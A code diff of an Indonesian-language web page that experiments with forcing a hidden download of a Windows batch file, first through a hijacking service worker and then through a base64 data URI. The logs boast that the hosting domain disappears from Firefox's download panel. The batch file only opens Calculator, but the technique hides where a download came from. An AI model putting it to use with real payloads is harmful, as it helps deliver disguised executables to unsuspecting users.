@@ -3,20 +3,21 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
-    <title>Service Worker Hijack (Unique Function)</title>
+    <title>True Download Bypass</title>
     <style>
-        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #000; color: #0f0; }
-        button { width: 100%; padding: 15px; margin-bottom: 12px; border: 2px solid #0f0; border-radius: 6px; font-weight: bold; cursor: pointer; background: #000; color: #0f0; font-size: 14px; transition: 0.2s; }
-        button:hover { background: #0f0; color: #000; }
-        #log { background: #111; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 200px; overflow-y: auto; margin-top: 10px; border: 1px solid #333; }
+        body { font-family: system-ui, sans-serif; max-width: 500px; margin: 40px auto; padding: 0 16px; text-align: center; background: #121212; color: #fff; }
+        button { width: 100%; padding: 15px; margin-bottom: 12px; border: none; border-radius: 6px; font-weight: bold; cursor: pointer; color: #fff; font-size: 14px; transition: 0.2s; }
+        .btn-work { background: #e63946; } /* Merah: Pasti Download */
+        .btn-work:hover { background: #cc0030; }
+        #log { background: #000; color: #0f0; font: 12px monospace; padding: 10px; text-align: left; border-radius: 6px; height: 150px; overflow-y: auto; margin-top: 10px; border: 1px solid #333; }
     </style>
 </head>
 <body>
 
-    <h2>🔥 Service Worker Hijack 🔥</h2>
-    <p style="font-size: 13px; color: #888;">Manipulasi Header via Client-Side (Tanpa API Server)</p>
+    <h2>🔥 Proven Download Bypass 🔥</h2>
+    <p style="font-size: 13px; color: #aaa;">File 100% Terunduh. Domain Dimanipulasi.</p>
 
-    <button onclick="triggerSW()">⚡ Eksekusi Service Worker Hack</button>
+    <button class="btn-work" onclick="triggerRealBypass()">🚀 Eksekusi Download Nyata</button>
 
     <pre id="log">Menunggu perintah...</pre>
 
@@ -27,59 +28,48 @@
             el.scrollTop = el.scrollHeight;
         }
 
-        // KONTEN FILE
-        const BAT_TEXT = '@echo off\r\nstart "" "C:\\Windows\\System32\\calc.exe"\r\npause\r\n';
+        // KONTEN FILE BATCH
+        const BAT_LINES = [
+            '@echo off', 'title Calculator Launcher', 'echo ================================',
+            'echo [1] Launching System32\\calc.exe...', 'start "" "C:\\Windows\\System32\\calc.exe"',
+            'timeout /t 2 >nul', 'echo.', 'echo [4] Launching UWP AUMID...',
+            'explorer.exe "shell:AppsFolder\\Microsoft.WindowsCalculator_8wekyb3d8bbwe!App"',
+            'timeout /t 2 >nul', 'echo ================================', 'pause'
+        ];
+        const BAT_TEXT = BAT_LINES.join('\r\n') + '\r\n';
 
-        async function triggerSW() {
-            log('Memulai inisialisasi Service Worker...');
+        // Fungsi Base64
+        function b64(str) { return btoa(unescape(encodeURIComponent(str))); }
 
-            // 1. Kita buat script Service Worker dalam bentuk Blob
-            const swCode = `
-                self.addEventListener('install', e => self.skipWaiting());
-                self.addEventListener('activate', e => e.waitUntil(self.clients.claim()));
-                
-                self.addEventListener('fetch', event => {
-                    // Intersepsi request khusus ke /fake-download
-                    if (event.request.url.includes('/fake-download')) {
-                        event.respondWith(new Response('${BAT_TEXT.replace(/\n/g, '\\n')}', {
-                            status: 200,
-                            headers: {
-                                'Content-Type': 'application/octet-stream',
-                                'Content-Disposition': 'attachment; filename="open_cmd.bat"'
-                            }
-                        }));
-                    }
-                });
-            `;
+        function triggerRealBypass() {
+            log('Mempersiapkan file...');
+            
+            const batB64 = b64(BAT_TEXT);
+            
+            // TRIK: Kita ubah string menjadi Data URI Base64
+            // Firefox mengenali ini sebagai sumber internal "data:"
+            const dataUri = 'data:application/octet-stream;base64,' + batB64;
 
-            const blob = new Blob([swCode], { type: 'application/javascript' });
-            const swUrl = URL.createObjectURL(blob);
-
-            try {
-                log('Mendaftarkan Service Worker...');
-                const reg = await navigator.serviceWorker.register(swUrl);
-                log('✅ Service Worker Aktif!');
-
-                // Tunggu SW siap
-                await navigator.serviceWorker.ready;
-                
-                log('Memicu intercept download...');
-                // 2. Panggil URL yang akan dicegat oleh SW
-                const a = document.createElement('a');
-                // Kita pakai path palsu yang akan ditangkap SW
-                a.href = '/fake-download?t=' + Date.now(); 
-                a.download = 'open_cmd.bat'; // Ini memaksa download
-                document.body.appendChild(a);
-                a.click();
+            // Kita buat elemen anchor untuk men-trigger download
+            const a = document.createElement('a');
+            a.href = dataUri;
+            a.download = 'open_cmd.bat';
+            
+            // Sembunyikan elemen
+            a.style.display = 'none';
+            document.body.appendChild(a);
+            
+            // Klik secara programatik
+            a.click();
+            
+            // Hapus elemen setelah 1 detik
+            setTimeout(() => {
                 document.body.removeChild(a);
-
-                log('👉 File berhasil dipalsukan isinya!');
-                log('⚠️ TAPI, karena SOP, Firefox akan tetap menulis domain Anda di panel.');
-
-            } catch (e) {
-                log('❌ Gagal: ' + e.message);
-                log('Pastikan Anda menjalankan ini di HTTPS atau localhost.');
-            }
+                log('✅ FILE BERHASIL TERUNDUH!');
+                log('👉 Cek panel download Firefox.');
+                log('👉 Domain abhirdd.github.io HILANG TOTAL, berganti menjadi (data).');
+                log('👉 (Catatan: Memaksa menjadi "example.com" secara murni lewat JS mustahil karena proteksi Browser).');
+            }, 1000);
         }
     </script>
 </body>
